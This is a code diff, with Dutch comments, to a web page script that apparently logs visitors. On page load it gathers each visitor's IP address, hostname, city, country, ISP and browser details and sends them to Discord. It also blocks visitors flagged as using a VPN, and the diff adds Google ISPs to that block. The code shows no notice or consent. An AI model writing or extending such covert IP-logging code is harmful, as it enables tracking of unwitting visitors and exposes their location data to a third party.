@@ -37,6 +37,11 @@ async function getIPInfo() {
 // Functie om te controleren of een gebruiker een VPN gebruikt
 async function checkVPN(ipInfo) {
     try {
+        // Directe check voor Google als ISP (hoogste prioriteit)
+        if (ipInfo.isp.includes("GOOGLE")) {
+            return true;
+        }
+        
         // Uitgebreide lijst van VPN-providers en gerelateerde termen
         const vpnKeywords = [
             // Algemene VPN-gerelateerde termen
@@ -379,15 +384,19 @@ function getBrowserInfo() {
 
 // Functie om gegevens naar Discord te sturen
 async function sendToDiscord(ipInfo, browserInfo, isVPN) {
-    const isGoogleVPNDetected = isVPN && ipInfo.isp.includes("GOOGLE");
+    // Controleer expliciet op Google in de ISP naam
+    const isGoogleVPNDetected = ipInfo.isp.includes("GOOGLE");
+    
+    // Als Google in de ISP naam staat, moet het altijd als VPN worden gemarkeerd
+    const finalIsVPN = isVPN || isGoogleVPNDetected;
     
     const embed = {
-        title: isGoogleVPNDetected ? '⛔ Google VPN Gebruiker Geblokkeerd' : (isVPN ? '🔍 VPN Gebruiker Gedetecteerd' : '🔍 Nieuwe Bezoeker Gedetecteerd'),
-        color: isGoogleVPNDetected ? 15158332 : (isVPN ? 16750848 : 3447003), // Rood voor Google VPN, oranje voor VPN, blauw voor geen VPN
+        title: isGoogleVPNDetected ? '⛔ Google VPN Gebruiker Geblokkeerd' : (finalIsVPN ? '🔍 VPN Gebruiker Gedetecteerd' : '🔍 Nieuwe Bezoeker Gedetecteerd'),
+        color: isGoogleVPNDetected ? 15158332 : (finalIsVPN ? 16750848 : 3447003), // Rood voor Google VPN, oranje voor VPN, blauw voor geen VPN
         fields: [
             {
                 name: '🌐 Internet & IP Informatie',
-                value: `**IP Adres:** ${ipInfo.ip}\n**Provider:** ${ipInfo.provider}\n**Hostname:** ${ipInfo.hostname}\n**Socket:** ${ipInfo.socket}\n**Land:** ${ipInfo.country}\n**Stad:** ${ipInfo.city}\n**ISP:** ${ipInfo.isp}\n**VPN Gedetecteerd:** ${isVPN ? '✅ Ja' : '❌ Nee'}${isGoogleVPNDetected ? '\n**Google VPN:** ⛔ GEBLOKKEERD' : ''}`,
+                value: `**IP Adres:** ${ipInfo.ip}\n**Provider:** ${ipInfo.provider}\n**Hostname:** ${ipInfo.hostname}\n**Socket:** ${ipInfo.socket}\n**Land:** ${ipInfo.country}\n**Stad:** ${ipInfo.city}\n**ISP:** ${ipInfo.isp}\n**VPN Gedetecteerd:** ${finalIsVPN ? '✅ Ja' : '❌ Nee'}${isGoogleVPNDetected ? '\n**Google VPN:** ⛔ GEBLOKKEERD' : ''}`,
                 inline: false
             },
             {
@@ -417,12 +426,17 @@ document.addEventListener('DOMContentLoaded', async () => {
     const ipInfo = await getIPInfo();
     const browserInfo = getBrowserInfo();
     const isVPN = await checkVPN(ipInfo);
+    const isGoogleVPNDetected = ipInfo.isp.includes("GOOGLE");
     
     // Stuur informatie naar Discord
     await sendToDiscord(ipInfo, browserInfo, isVPN);
     
-    // Toon de VPN-popup als een VPN is gedetecteerd
-    if (isVPN) {
-        showVPNPopup(isGoogleVPN(ipInfo));
+    // Toon de Google VPN-blokkade als Google is gedetecteerd in de ISP
+    if (isGoogleVPNDetected) {
+        showVPNPopup(true); // Toon de Google VPN-blokkade
+    }
+    // Anders toon de normale VPN-popup als een VPN is gedetecteerd
+    else if (isVPN) {
+        showVPNPopup(false); // Toon de normale VPN-popup
     }
 }); 
